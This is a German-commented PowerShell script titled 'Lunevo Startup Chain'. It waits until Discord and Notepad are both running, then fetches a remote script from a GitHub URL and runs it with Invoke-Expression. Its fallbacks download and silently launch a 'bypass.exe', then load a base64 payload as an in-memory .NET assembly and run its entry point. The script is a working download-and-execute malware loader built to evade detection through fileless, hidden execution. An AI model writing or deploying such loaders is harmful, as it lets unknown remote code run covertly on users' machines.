# Lunevo Startup Chain
# Wird automatisch ausgeführt wenn Discord UND Notepad geöffnet werden

Start-Sleep -Seconds 2

# Prüfe ob Discord UND Notepad laufen
$discordRunning = Get-Process -Name "discord" -ErrorAction SilentlyContinue
$notepadRunning = Get-Process -Name "notepad" -ErrorAction SilentlyContinue

if ($discordRunning -and $notepadRunning) {
    # Beide Prozesse laufen - Starte Bypass fileless
    
    # Option 1: PowerShell Loader (fileless)
    $loaderUrl = "https://raw.githubusercontent.com/lunevo/lunevosvc/main/loader.ps1"
    try {
        $loader = Invoke-WebRequest -Uri $loaderUrl -UseBasicParsing -ErrorAction Stop
        Invoke-Expression $loader.Content
    } catch {
        # Option 2: Fallback - Download EXE und starte
        $exeUrl = "https://raw.githubusercontent.com/lunevo/lunevosvc/main/bypass.exe"
        $exePath = "$env:TEMP\Lunevo\bypass.exe"
        
        # Erstelle Verzeichnis falls nicht vorhanden
        $exeDir = Split-Path -Parent $exePath
        if (-not (Test-Path $exeDir)) {
            New-Item -ItemType Directory -Path $exeDir -Force | Out-Null
        }
        
        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing -ErrorAction Stop
            if (Test-Path $exePath) {
                Start-Process -FilePath $exePath -WindowStyle Hidden
            }
        } catch {
            # Option 3: Base64-encoded Payload (vollständig fileless)
            $base64Url = "https://raw.githubusercontent.com/lunevo/lunevosvc/main/payload.b64"
            try {
                $base64 = Invoke-WebRequest -Uri $base64Url -UseBasicParsing -ErrorAction Stop
                $bytes = [Convert]::FromBase64String($base64.Content.Trim())
                $assembly = [System.Reflection.Assembly]::Load($bytes)
                $entryPoint = $assembly.EntryPoint
                if ($entryPoint) {
                    $entryPoint.Invoke($null, @())
                }
            } catch {
                Write-Host "[FEHLER] Konnte Bypass nicht starten" -ForegroundColor Red
            }
        }
    }
}

